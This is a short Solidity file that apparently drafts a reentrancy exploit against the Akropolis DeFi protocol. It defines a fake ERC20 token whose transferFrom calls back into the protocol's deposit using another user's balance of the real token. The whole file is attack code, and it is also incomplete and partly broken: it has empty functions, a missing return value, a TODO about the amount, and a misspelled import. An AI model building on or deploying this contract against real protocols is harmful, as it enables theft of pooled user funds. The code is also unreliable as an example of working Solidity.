  
import "./ERC20.sol";
import "./Arkopolis.sol";
contract FAKE is ERC20 {
    
    address ark_address;
    address REAL;
    constructor(address _ark_address, address _REAL) {
        ark_address = _ark_address;
        REAL = _REAL;
    }
    
    function deposit() public payable {
    }
    
    function withdraw() public {

    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        uint sender_balance = iERC20(REAL).balanceOf(sender);
        AkropolisProtocol(ark_address).deposit(sender, REAL, REAL, sender_balance / 2, 0); // TODO - change to sender_balance
    }
}